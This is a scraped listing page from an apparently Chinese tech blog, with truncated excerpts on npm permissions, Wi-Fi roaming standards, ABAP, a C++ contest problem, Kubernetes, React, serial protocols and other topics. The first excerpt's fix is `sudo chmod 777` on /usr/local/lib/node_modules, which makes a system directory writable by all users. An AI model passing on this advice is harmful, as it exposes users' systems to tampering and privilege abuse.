		问题原因：node_modules文件夹操作没有权限
问题解决：
一行命令解决问题
sudo chmod 777 /usr/local/lib/node_modules
详细内容介绍
查看node_modules文件夹的权限，如下内容 说明普通用户执行没有写的权限 ➜ ~ cd /usr/local/lib ➜ lib ls node_modules total 0 drwxr-xr-x 5 root wheel 160 7 16 09:19 . drwxr-xr-x 9 root wheel 288 7 16 09:19 .. drwxr-xr-x 3 root wheel 96 5 26 15:25 docker drwxr-xr-x 3 root wheel 96 7 1 03:17 dtrace drwxr-xr-x 3 root wheel 96 7 16 09:19 node_modules 修改node_modules文件夹权限 ➜ lib sudo chmod 777 node_modules Password: ➜ lib ls -all total 0 drwxr-xr-x 5 root wheel 160 7 16 09:19 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5df94fd35b667e03fff9fb5859503b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4ed90e153734d0bfcfee6fdaf2bbac5/" rel="bookmark">
			wifi 802.11 kvr  漫游
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		802.11k
802.11k为无线局域网应该如何进行信道选择、漫游服务和传输功率控制提供了标准。他提供无线资源管理，让频段（BAND）、通道（CHANNEL）、载波（CARRIER）等更灵活动态地调整、调度，使有限的频段在整体运用效益上获得提升。在一个无线局域网内，每个设备通常连接到提供最强信号的接入点。这种管理有时可能导致对一个接入点过度需求并且会使其他接入点利用率降低，从而导致整个网络的性能降低，这主要是由接入用户的数目及地理位置决定的。在一个遵守802.11k规范的网络中，如果具有最强信号的接入点以其最大容量加载，而一个无线设备连接到一个利用率较低的接入点，在这种情况下，即使其信号可能比较弱，但是总体吞吐量还是比较大的，这是因为这时网络资源得到了更加有效的利用。
802.11r
802．11r标准，着眼于减少漫游时认证所需的时间，这将有助于支持语音等实时应用。使用无线电话技术的移动用户必须能够从一个接入点迅速断开连接，并重新连接到另一个接入点。这个切换过程中的延迟时间不应该超过50毫秒，因为这是人耳能够感觉到的时间间隔。但是802.11网络在漫游时的平均延迟是几百毫秒，这直接导致传输过程中的断续，造成连接丢失和语音质量下降。所以对广泛使用的基于802.11的无线语音通讯来说，更快的切换是非常关键的。802.11r改善了移动的客户端设备在接入点之间运动时的切换过程。协议允许一个无线客户机在实现切换之前，就建立起与新接入点之间安全且具备QoS的状态，这会将连接损失和通话中断减到最小。
802.11v
无线网络管理。V工作组是最新成立的小组，其任务将基于802.11k所取得的成果。802.11v主要面对的是运营商，致力于增强由Wi-Fi网络提供的服务。无线终端设备的控制涉及多个方面。负载平衡功能能够根据接入点的负载情况在它们之间分配无线终端设备。目前，这项任务是通过阻止终端设备连接在超载的接入点上或结束已经连接到接入点上的终端设备会话来实现的。可是，这些活动可能中断终端设备会话。802.11v设想通过将终端设备引导到具有可用带宽和资源的接入点，使负载平衡变得对用户透明。
该标准可以加快网络的部署。在使用802.11网络时，终端设备加入到具有SSID特性的网络。现在没有一种无须手工为终端设备配置SSID和安全证书、自动告知终端设备应当连接在什么网络上的机制。802.11v中建议了实现从基础设施进行安全终端配置的功能，这将大大减少大型网络中的部署时间。
802.11r 1.1 简介 802.11r协议中定义的FT（Fast BSS Transition，快速BSS切换）功能用来减少客户端在漫游过程中的时间延迟，从而降低连接中断概率、提高漫游服务质量。
1.1.1 FT实现方式 FT支持两种方式：
· Over-the-Air：客户端直接与目标AP通信，进行漫游前的认证。
· Over-the-DS：客户端通过当前AP与目标AP通信，进行漫游前的认证。
1. AC内over-the-air方式漫游
图1-1 AC内over-the-air方式漫游示意图
如图1-1所示，客户端在连接至同一AC的AP间（AP 1到AP 2）漫游时，信息交互过程描述如下：
(1) 客户端已经与AP 1连接并且要漫游到AP 2；
(2) 客户端向AP 2发送认证请求；
(3) 客户端收到AP 2的认证请求回应；
(4) 客户端向AP 2发送重关联请求；
(5) 客户端收到AP 2的重关联请求回应；
(6) 客户端完成从AP 1到AP 2的漫游。
2. AC间over-the-air方式漫游
图1-2 AC间over-the-air方式漫游示意图
如图1-2所示，AP 1和AP 2分别连接AC 1和AC 2，在同一移动域内漫游的信息交互过程描述如下：
(1) 客户端与AP 1建立连接；
(2) AC 1同步客户端漫游信息（PMK、VLAN等信息）到AC 2；
(3) 客户端准备漫游，发送FT认证请求到AP 2；
(4) 客户端收到AP 2发送的FT认证回复；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4ed90e153734d0bfcfee6fdaf2bbac5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bf36798eb56dd4e0996594748fd886b/" rel="bookmark">
			操作系统文件分配策略_操作系统中的文件分配方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作系统文件分配策略
分配方法 (Allocation Method) The allocation method defines how the files are stored in the disk blocks. The direct access nature of the disks gives us the flexibility to implement the files. In many cases, different files or many files are stored on the same disk. The main problem that occurs in the operating system is that how we allocate the spaces to these files so that the utilization of disk is efficient and the quick access to the file is possible.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7bf36798eb56dd4e0996594748fd886b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0703765ae6d4950985ff69567bf0a6f7/" rel="bookmark">
			ABAP 选择画面SELECT-OPTIONS必输项检查&amp;图标设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 如何将选择画面中SELECT-OPTIONS设置成必输项
2. 如何在点击“复选框”按钮时不报系统MSG
3. 如何在写入手动判断后，仍然在画面上显示必输项小图标
1. 如何将选择画面中SELECT-OPTIONS设置成必输项 不论是PARAMETERS还是SELECT-OPTIONS，在report程序定义时，后面添加OBLIGATORY即可将其定义成必输项目。
SELECTION-SCREEN BEGIN OF BLOCK B_01 WITH FRAME TITLE TEXT-B01. PARAMETERS: P_WERKS TYPE T001W-WERKS OBLIGATORY. "必输项 SELECT-OPTIONS: S_MATNR FOR G_WRK_MATNR OBLIGATORY. "必输项 SELECTION-SCREEN END OF BLOCK B_01. 在Dynpro程序中，在画面Layout里双击选择想要设置的项目，在Program的Tab页中Input Field设置成Required即可。
这样写入的必输项检查，此时如果用户在使用时未输入，则会触发系统报错消息（Message no. 00055）
光标定在出错的字段上，不会锁住其他输入框，且其他输入框的字是黑色的。
上面这两种情况是通过"系统的逻辑"将画面项目设置成了必输项，虽然比较便捷，但有一定的局限性。
对于SELECT-OPTIONS来说，在LOW值没有填写的情况下点击“复数条选择”也会触发系统报错消息。
显然，这样的设置对于用户来说并不友好。
那么为了规避这种情况的发生，在开发中我们会对SELECT-OPTIONS的选择项目手动写入CHECK。
2. 如何在点击“复选框”按钮时不报系统MSG 在AT-SELECTION-SCREEN事件中写入‘空值时报错的逻辑’，并且在检查前CHECK一下“复选框”按钮对应的SY-UCOMM即可。
如何判断屏幕上按钮的SY-UCOMM呢？
在Report程序中手动写入选择画面其实相当于系统自动创建了一个编号为1000的Dynpro画面，由此，画面上每一个项目都有自己对应的ID、画面上的按钮也有自己对应的触发key。为了查找该“复选框”按钮对应的触发key，我们在选择屏幕上/h进入Debug模式后，查看当前的SY-UCOMM参数值即可。
经过查看发现，系统自定义的“复选框”的SY-UCOMM均以%打头，后面的数字会有所不同。
所以我们在手动写入代码时，可以添加如下CHECK，去避免点击“复选框”时即触发检查的情况。
（应用截取字符串的方式，如果SY-UCOMM的第一位是%，就说明是画面上的按钮项目）
* 判断是否为点击复选框的情况 CHECK SY-UCOMM+0(1) &lt;&gt; '%'. * 客户为空值时 IF S_LIFNR[] IS INITIAL. SET CURSOR FIELD 'S_LIFNR-LOW'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0703765ae6d4950985ff69567bf0a6f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80239b9561b91c80b7c8d1c145c0d73b/" rel="bookmark">
			洛谷 ——【算法1-1】模拟与高精度 _乒乓球
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目背景 国际乒联现在主席沙拉拉自从上任以来就立志于推行一系列改革，以推动乒乓球运动在全球的普及。其中1111分制改革引起了很大的争议，有一部分球员因为无法适应新规则只能选择退役。华华就是其中一位，他退役之后走上了乒乓球研究工作，意图弄明白1111分制和2121分制对选手的不同影响。在开展他的研究之前，他首先需要对他多年比赛的统计数据进行一些分析，所以需要你的帮忙。
题目描述
华华通过以下方式进行分析，首先将比赛每个球的胜负列成一张表，然后分别计算在1111分制和2121分制下，双方的比赛结果（截至记录末尾）。
比如现在有这么一份记录，（其中W表示华华获得一分，L表示华华对手获得一分）：
WWWWWWWWWWWWWWWWWWWWWWLW
在1111分制下，此时比赛的结果是华华第一局1111比00获胜，第二局1111比00获胜，正在进行第三局，当前比分11比11。而在2121分制下，此时比赛结果是华华第一局2121比00获胜，正在进行第二局，比分22比11。如果一局比赛刚开始，则此时比分为00比00。直到分差大于或者等于22，才一局结束。
你的程序就是要对于一系列比赛信息的输入（WLWL形式），输出正确的结果。
输入格式
每个输入文件包含若干行字符串，字符串有大写的WW、LL和EE组成。其中EE表示比赛信息结束，程序应该忽略E之后的所有内容。
输出格式
输出由两部分组成，每部分有若干行，每一行对应一局比赛的比分（按比赛信息输入顺序）。其中第一部分是1111分制下的结果，第二部分是2121分制下的结果，两部分之间由一个空行分隔。
输入输出样例
输入 #1 复制
WWWWWWWWWWWWWWWWWWWW
WWLWE
输出 #1 复制
11:0
11:0
1:1
21:0
2:1
说明/提示
每行至多25个字母，最多有2500行
题目思路 在刚开始写这道题的时候自己是有思路的，但是总写不出来。去百度了一下大佬的思路。发现自己的思路稍稍有些问题。
1.在输入的时候自己总是很迷茫，掌握了很多输入方法可是每次在输入的时候找不到适合题目的输入方法。很多题目就被困在这一步真的很不应该。比如这道题，我最开始的思路是直接把字符输入到字符数组中去。但是这样会产生很多问题我却解决不了。大佬的思想就十分巧妙，找到一个中间量每次输入一个字符再把字符赋值给字符数组。并且还是记录下来字符的数量。
2.在判断胜负的时候，自己还是有点晕。无论是十一分制还是二十一分制胜利都要满足两个条件一个人胜利的场数大于分制数和分差大于等于2。
3.最后还有关键的一点，在定义字符数组的时候，一定要开大一些。最少大于25*2500。这是属于空间复杂度的计算。
不管是是不是借鉴了大佬的思路，写出这道题我还是很开心的，因为这道题我有在认真的思考。算法的学习就是这样，不怕你不会就怕你不知道思考。这道题应该还不属于算法题的范畴。只是一个简单的思路题。先把自己的基础打好再去学习算法吧，毕竟那东西太难了。
#include&lt;iostream&gt; using namespace std; int main() { char result[1000000]; char r; int ans=0; while(1) { cin&gt;&gt;r; if(r=='E') break; else if(r=='W'||r=='L') { result[ans]=r; ans++; } } int number_w=0,number_l=0; for(int i=0;i&lt;ans;i++) { if(result[i]=='W') number_w++; //记录华华胜利的场数 if(result[i]=='L') number_l++; if((number_w&gt;=11&amp;&amp;number_w-number_l&gt;=2)||(number_l&gt;=11&amp;&amp;number_l-number_w&gt;=2)) //十一分制下判断胜利 { cout&lt;&lt;number_w&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80239b9561b91c80b7c8d1c145c0d73b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6870d43da48ef7c90194ec0d201ae881/" rel="bookmark">
			机器人领域会议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器人领域的顶级国际会议有2个：
1. ICRA
全称是 International Conference on Robotics and Automation。机器人方向的都可以投，投稿日期是每年的4~5月左右。在ICRA上发表的文章有的会以扩充的方式随后出现在一些顶级期刊上，比如TRO和IJRR，可见文章的分量。不容易中，录用率很低，不过我也在上面见到过一些垃圾论文。
2. IROS
全称是 International Conference on Intelligent Robots and System。机器人方向的都可以投，投稿日期是每年的9~10月左右。
下面是一般的会议，相对来说比较容易中。
3. ROBIO
全称是 International Conference on Robotics and Biomimetics。主要针对仿生机器人或生物技术交叉领域，投稿日期是每年的10月左右。录用率大概在1/4左右。
4. ICMA
全称是 International Conference on Mechatronics and Automation。机器人方向的都可以投，投稿日期是每年的6~8月左右。
5. WCICA
全称是 World Congress on Intelligent Control and Automation。机器人方向的都可以投，投稿日期是每年的5~6月左右。如果写的比较正规基本上来者不拒。
6. CYBER
全称是 International Conference on CYBER Technology in Automation, Control and Intelligent Systems。新举办的会议，机器人方向的都可以投，投稿日期是每年的1~2月左右。
7. Humanoids
全称是 International Conference on Humanoid Robots。人形机器人方向的可以投，投稿日期是每年的6~7月左右。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6870d43da48ef7c90194ec0d201ae881/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3257553ac07c80f313bd25f8f2539685/" rel="bookmark">
			Unity —Spine动画
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spine是什么？
Spine 是一款针对游戏开发的 2D 骨骼动画编辑工具。 Spine 旨在提供更高效和简洁 的工作流程，以创建游戏所需的动画。
优势
在 Spine 中通过将图片绑定到骨骼上，然后再控制骨骼实现动画。 2D 骨骼动画相对于传统的逐帧动画有以下优势:
最小的体积:传统的动画需要提供每一帧图片。而 Spine 动画只保存骨骼的动画数据，它所占用的空间非常小，并能为你的游戏提供独一无二的动画。
美术需求:Spine 动画需要的美术资源更少，能为您节省出更多的人力物力更好的投入到游戏开发中去。
流畅性:Spine 动画使用差值算法计算中间帧，这能让你的动画总是保持流畅的效果。
装备附件:图片绑定在骨骼上来实现动画。如果你需要可以方便的更换角色的装备满足不同的需求。甚至改变角色的样貌来达到动画重用的效果。
混合:动画之间可以进行混合。比如一个角色可以开枪射击，同时也可以走、跑、跳或者游泳。
程序动画:可以通过代码控制骨骼，比如可以实现跟随鼠标的射击，注视敌人，或者上坡时的身体前倾等效果。
功能
摄影表
在动画制作过程中摄影表是最核心的地方。这里包含了所有重要的细节，通过它可以创建动画以及对时间轴进行微调。
曲线编辑器
在曲线编辑器中可以通过调整贝赛尔曲线来控制两帧之间的差值，以实现栩栩如生的动画效果。
反向动力学工具
姿势工具可以利用反向动力学便捷的调整姿势。
皮肤
皮肤可以为做好的动画切换图片素材。通过改变附加在骨骼上的图片来实现动画的重用。
边界框
边界框可以附加在骨骼上，并且随着骨骼移动。它主要用于碰撞检测和物理集成。
网格
允许你在矩形边界内自定义多边形。这将提高最终纹理贴图集的空间使用率，因为在多边形外的像素将被忽略掉，这种优化对移动设备来说特别重要。网格的另外一个功能就是支持自由变形和蒙皮。
自由变形
自由变形也称为FFD，是Free-Form Deformation的简写，它允许你通过移动网格点来变形图片。FFD 能实现网格的:拉伸、挤压、弯曲、反弹，等一些矩形图片无法实现的功能。
蒙皮
蒙皮允许将网格中指定的点附加给指定骨骼。然后附加点将随着骨骼移动，网格则随之自动发生变形。现在可以用骨骼动作控制角色的图片进行弯曲变形了。
输出格式
Spine 能将项目中的动画导出为 JSON 或二进制格式文件，它们能在 Spine 运行时库中完美的再现。 Spine 同时还可以导出 GIF 动画， PNG 或 JPG 序列图，还有 AVI或 QuickTime 的视频文件。
导入
Spine 通过路径查找并导入由其它工具生成的数据文件，它能够识别符合要求的JSON 或二进制格式数据。也可以从别的 Spine 项目中导入骨架和动画。
纹理打包
Spine 能将图片打包成纹理贴图集，这能提高你在游戏中的渲染效率。Spine 的纹理贴图打包工具拥有很多功能比如剥离空白区域，旋转，自动缩放等等…(主要目的是为了充分利用空间)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3257553ac07c80f313bd25f8f2539685/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c7f36175d4fe70216e9aed6f3323ed5/" rel="bookmark">
			搭建Kubernetes高可用集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		k8s高可用集群 1. 集群拓扑 2. Loadbalancer部署 yum install -y keepalived haproxy 配置haproxy
vim /etc/haproxy/haproxy.cfg 3. keepalived配置 vim /etc/keepalived/keepalived.conf 1 ! Configuration File for keepalived 2 3 global_defs { 4 notification_email { 5 root@localhost 6 } 7 notification_email_from keepalived@localhost 8 smtp_server 127.0.0.1 9 smtp_connect_timeout 30 10 router_id LVS_DEVEL 11 } 12 vrrp_script check_haproxy { 13 script "/etc/keepalived/check_haproxy.sh" 14 interval 5 15 } 16 17 vrrp_instance VI_1 { 18 state BACKUP ##主为MASTER 备未BACKUP 19 interface eth0 20 virtual_router_id 51 21 priority 90 22 advert_int 1 23 authentication { 24 auth_type PASS 25 auth_pass 1111 26 } 27 28 track_script { 29 check_haproxy 30 } 31 virtual_ipaddress { 32 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c7f36175d4fe70216e9aed6f3323ed5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68e69b8d0c63755cc89eb59ee8152013/" rel="bookmark">
			相似度的几种常见计算方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相似度的计算现有的关于相似度计算的方法，基本上都是基于向量的，也即计算两个向量之间的距离，距离越近越相似。下面是几种常见的相似度计算方法。
1.杰卡德相似系数 Jaccard（杰卡德）相似性系数主要用于计算符号度量或布尔值度量的样本间的相似度。
Jaccard（杰卡德）系数等于样本集交集的个数和样本集并集个数的比值。
Jaccard（杰卡德）距离是用两个集合中不同元素所占元素的比例来衡量两个集合（样本）的区分度。
Jaccard系数主要的应用的场景有：
1).过滤相似度很高的新闻，或者网页去重
2).考试防作弊系统
3).论文查重系统
2.余弦相似度 是通过计算两个向量的夹角余弦值来评估他们的相似度。
如图，假设 = （x1,y1）， = （x2,y2）,则余弦相似度的计算公式为：
余弦相似度主要的应用的场景有：
1）推荐系统中的协同过滤
2）计算文本的相似性
3.通过距离计算相似度 二维空间中，假设 = （x1,y1）， = （x2,y2）
1）欧式距离
2）曼哈顿距离
以上的都为二位向量，多维的可进行类比。
4.皮尔逊相关系数 一般用于计算两个定距变量间联系的紧密程度。假设有两个变量X,Y，则它们之间的相关系数为：
最终计算出的相关系数的含义可以有如下理解：
1）当相关系数为0时，X和Y两变量无关系。
2）当X的值增大（减小），Y值增大（减小），两个变量为正相关，相关系数在0.00与1.00之间。
3）当X的值增大（减小），Y值减小（增大），两个变量为负相关，相关系数在-1.00与0.00之间。
当两个变量的标准差都不为零时，相关系数才有定义，皮尔逊相关系数适用于：
1）两个变量之间是线性关系，都是连续数据。
2）两个变量的总体是正态分布，或接近正态的单峰分布。
3）两个变量的观测值是成对的，每对观测值之间相互独立。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/178febcdc2c5801052bf69aa0e01e28f/" rel="bookmark">
			C&#43;&#43;中的string与char[]、char*详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020年7月15日 周三 天气晴 【不悲叹过去，不荒废现在，不惧怕未来】
关于C++里的字符串和字符数组以及字符指针，一直都搞不太明白，今天在这里做个总结，希望能彻底弄懂它们。
本文目录 一、C++中两种风格的字符串：1. C-风格字符串2. C++中的string类 二、C++在定义字符串时，可能会出现以下几种形式：1. string2. char[]、const char[]、char*、const char*（1） char str1[] = "abc"（2） const char str3[] = "abc"（3） const char *str5 = "abc" 三、数组名char[] 和 数组指针char *1. 数组名和数组指针的显著不同点：（1） 数组名 b 可以看作指针常量（只能看作，并不是指针常量，具体代表什么后面会说），对应着数组的首地址，其值不能改变；b 对应的内存区域总是可写。（2） 数组指针 a 是变量，值可以改变；a 指向的区域有时可写，有时只读。 2. 数组名和数组指针的其它不同点（1） 数组名指代一种数据结构：数组另外， cout 打印字符数组名会得到整个字符串（仅字符数组）： （2） 数组名作为函数形参时，在函数体内，其失去了本身的内涵，仅仅只是一个指针。在失去其内涵的同时，它还失去了其常量特性，可以作自增、自减等操作，可以被修改。 参考文献 一、C++中两种风格的字符串： C-风格字符串C++引入的string类 1. C-风格字符串 C-风格字符串起源于 C 语言，并在 C++ 中继续得到支持。C-风格字符串实际上是使用 null 字符 ‘\0’ 终止的一维字符数组。下面是C-风格字符串的两种写法：
char a[6] = {'H', 'e', 'l', 'l', 'o', '\0'}; char a[] = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/178febcdc2c5801052bf69aa0e01e28f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd0e43f8a694861fa34ef45ea6b0f565/" rel="bookmark">
			用思维模型去理解 React
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我了解到，掌握了某种语言、框架或工具的人与没有掌握的人之间的最大区别在于他们所使用的思维模型（Mental Model）。前者拥有清晰而先进的思维模型，而后者则没有。
通过良好的思维模型，你可以直观地理解复杂的问题和解决方案，这比逐步的去寻求解决方案要快得多。
我每天都用 react 工作，并且一直都在寻找解决难题的解决方案。我可以通过在围绕 react 创建的良好思维模型来做到这一点。在本文中，我将解释那些有助于解决问题和解决复杂性的思维模型。
无论你是已经使用 react 多年的老鸟还是刚开始使用的新手，在我看来，有用的思维模型是使自己有信心使用它的最快方法。 什么是思维模型？ 思维模型是我们如何想象一个系统正常工作的方法。我们通过了解系统的不同部分并把他们连接起来，这一点很重要，因为它可以帮助我们理解世界并解决问题。
思维模型的一个很好例子就是互联网：互联网是一个复杂的系统，有许多相互连接的部分，但是请考虑一下你是怎样想象它工作方式的。我的想像是通过许多大型服务器相互连接的大量计算机，其中有许多中间设备对每条信息的存储位置进行重定向。
当然这并不是一个完整的思维模型，但足够好，我可以用它来解决问题，并在需要时加以改进，这就是重点：思维模型旨在帮助我们解决问题和理解世界。
为什么思维模型很重要？ 当我在 2014 年开始搭建网站时，很难理解它的工作原理。用 WordPress 构建我的博客很容易，但是我对托管、服务器、DNS、证书等等一无所知。
当我开始阅读文章并尝试一些东西（并多次破坏我的服务器配置）时，就开始掌握这种系统来了解它的工作方式，直到最终它被建立。我的头脑围绕该系统建立了一个思维模型，可以用来与之合作。
如果有人解释了它，并将他们的思维模型转移给我，我就会更快地了解它。在这里我将会解释（并展示）自己在 react 中使用的思维模型。它将帮助你更好地理解 react，并使你成为更好的开发人员。
react 思维模型 react 帮助我们比以往更轻松地构建复杂的交互式 UI。它还鼓励我们以某种方式编写代码，指导我们创建更易于浏览和理解的应用。
react 本身是一个以简单思想为核心的思维模型：对依赖相似逻辑和 UI 的程序部分进行封装，react 将会始终确保该部分保持最新。
无论你是刚刚开始使用 react 还是已经用了多年，拥有清晰的思维模式能够让你更有信心去使用它。所以我要把自己的思维模式转移给你，并从第一原理开始并在其基础上进行构建。
函数贯穿始终 首先为 JavaScript 和 React 的基本构建模块建模：函数。
React 组件只是一个函数包含其他组件的组件是调用其他函数的函数prop 是函数的参数 这被 React 所使用的标记语言 jsX 隐藏。剥离掉 jsX 的 React 是一堆互相调用的函数。 jsX 本身就是一种实用的思维模型，使 React 用起来更简单、更直观。
让我们分别看一下所有的部分。
组件是返回 jsX 的函数 React 与 jsX（JavaScript XML）一起使用，jsX 是一种完全利用 JavaScript 的功能来编写类似 html 代码的方法。 jsX 为以直观的方式使用嵌套函数提供了一个出色的应用思维模型。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd0e43f8a694861fa34ef45ea6b0f565/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5449672a643ce3a21cf30f0902d77b83/" rel="bookmark">
			RS232、RS422、RS485区别和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 前言：大多数人的疑惑
一涉及到串口通讯，比如RS232、RS422、RS485，大多数人第一就想到DB9接口，然后老想着怎么焊接针脚，这可能受RS232的影响，因为市面上大多数设备都支持RS232接口，而RS232往往以DB9接口为物理连接。这是大家平常少接触串口的结果，实际上RS232、RS485、RS422的物理接口没有固定的形态，主要跟厂家设计决定，但多数情况下，RS232以DB9为物理接口，RS485和RS422以凤凰头插口为物理接口。假设一个场景 RS232、RS422、RS485都是以DB9为物理接口，千万别简单的对接起来，这样是不能直接通讯，因为它们是不同的协议，如果要通讯必须买转换模块（或数据线）。
二、RS232、RS422、RS485串口协议对比表：
注释：
1、工作方式：单端非平衡有地线，受底线压差影响，导致只能本地段距离传输。而差分平衡没有地线，传输距离长。
2、双工模式定义：信息能双向传送但不能同时双向传送称为半双工；信息能够同时双向传送则称为全双工。
3、物理接口：可以是 网口、DB9、DB25、凤凰头等接口，使用时根据主从设备串口接口对应连接就行了，切记不同协议口不能直联，中间要加转换模块。
4、连接方式：
4.1、RS232只能点对点通讯。
4.2、RS422点对点连接（一主一从）
4.2.1、RS422串联方法，也叫手拉手连接，直接使用“从”设备上的RS422(IN)和RS422（out）串联一一设备，如果设备本身没有，那就购买RS422扩展模块,如下图。
4.2.2、RS422并联方法，属于单向传输执行命令，并联的条件是“从”设备不用给“主”数据反馈。如果把“从”设备的发射端点连接在一起，可能有电压冲突烧设备的风险。
4.3、RS485的串联方法，也叫手拉手连接，同样如果设备不具备RS284in和out，那就购买RS485扩展模块。
4.3.1、RS485的并联方法，将所有RS-485设备直接并联在一起（即所有A接一起、所有B接一起），
备注：不管RS422、RS485的连接方式是串联还是并联，必须事先在“从”设备上配置地址码，之后“主”设备就是通过地址码控制“从”设备的，另外指令的发起必须由“主”设备开始。
调试助手（“主”设备）发数据代码给地址码为7的“从”设备，那么代码的第一个字节为地址码，如070000000001，所有“从”设备将接收到代码，但只有地址码为7的设备会反馈数据，而其它地址码设备安兵不动。
5、焊接针脚：根据实际“主、从"设备提供的接口焊接，RS232主(2,3,5)→从(3,2,5);RS422主(T+,T-,R+,R-)→从(R+,R-,T+,T-)；RS485主(+,-)→从（+,-)。
5.1、案例1: “主"设备RS485为DB9，“从"设备的RS485为凤凰头，那么就要求“主设备”厂家提供DB9中哪两个针脚用于RS485,之后焊接好“主”这端，而“从”设备直接拧线即可，最后这根线一端为DB9，另一端是凤凰头。“主、从”设备都提供有RS485接口，所以这根线不是转换线，这个要清楚。
5.2、案例2：“主”设备只有RS232协议的DB9接口，“从”设备只有RS485的DB9接口，很多人会犯错直接用DB9成品线连接了，结果发现通讯不了，看好这两个协议是不同的，接口相同也没有。所以购买一个RS232与RS485的转换器，作为中间转换才行，如果转换器的接口不是DB9，那么还要对应焊接。
三、扩展：查看串口传输的代码（数据）
串口的数据传输是不加密的，可以直接查看。
假如一个运行的环控系统出故障，只知道串口是232，波特率是9600，结构如下
采集器232out--------&gt;232in电池UPS主机
测试方法：
3.1、将UPS端的232拔出，接到电脑的USB转232线上（注意发收对应线序的2和3针脚）。
3.2、打开电脑软件调试助手，设置COM口及波特率9600，点打开串口。
3.3、正常情况下，此时调试助手会接收到采集器发送给UPS的代码。
3.4、如果没有代码，说明采集器配置有问题，或者物理线路有问题。
3.5、调试助手接收到代码后，将电脑USB转232接入UPS232口，用电脑发送代码给UPS，看UPS是否有反馈（软件会接收到反馈代码），如果没有反馈数据，说明代码不对，或者UPS232的接口有问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd2ddf33d79cd63d0d8f1b3e88ff380d/" rel="bookmark">
			Kubernetes之资源监控
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、k8s容器资源限制 Kubernetes采用request和limit两种限制类型来对资源进行分配。
request(资源需求):即运行Pod的节点必须满足运行Pod的最基本需求才能运行Pod。limit(资源限额):即运行Pod期间,可能内存使用量会增加,那最多能使用多少内存,这就是资源限额 资源类型:
CPU 的单位是核心数,内存的单位是字节。一个容器申请0.5个CPU,就相当于申请1个CPU的一半,你也可以加个后缀m 表示千分之一的概念。比如说100m的CPU,100豪的CPU和0.1个CPU都是一样的。 内存单位:
K、M、G、T、P、E #以1000为换算标准Ki、Mi、Gi、Ti、Pi、Ei #以1024为换算标准 内存限制示例:
apiVersion: v1 kind: Pod metadata: name: memory-demo spec: containers: - name: memory-demo image: reg.harbor.com/library/stress args: - --vm - "1" - --vm-bytes - 200M resources: requests: memory: 50Mi limits: memory: 100Mi kubectl create -f memory.yaml kubectl get pod 如果容器超过其内存限制,则会被终止。如果可重新启动,则与所有其他类型的运行时故障一样,kubelet 将重新启动它。
如果一个容器超过其内存请求,那么当节点内存不足时,它的 Pod 可能被逐出。
CPU限制示例:
apiVersion: v1 kind: Pod metadata: name: cpu-demo spec: containers: - name: cpu-demo image: reg.harbor.com/library/stress resources: limits: cpu: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd2ddf33d79cd63d0d8f1b3e88ff380d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/872e70bd9e199f042cdd3ebc17bdaa7d/" rel="bookmark">
			四元数与欧拉角
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		四元数与欧拉角 一、前言二、欧拉角三、四元数1、四元数各值的意义2、四元数转换为旋转矩阵3、参考源码 一、前言 欧拉角与四元数都被用来处理图像学中的旋转。两者各有优劣，下面我们对它们做详细的比较。
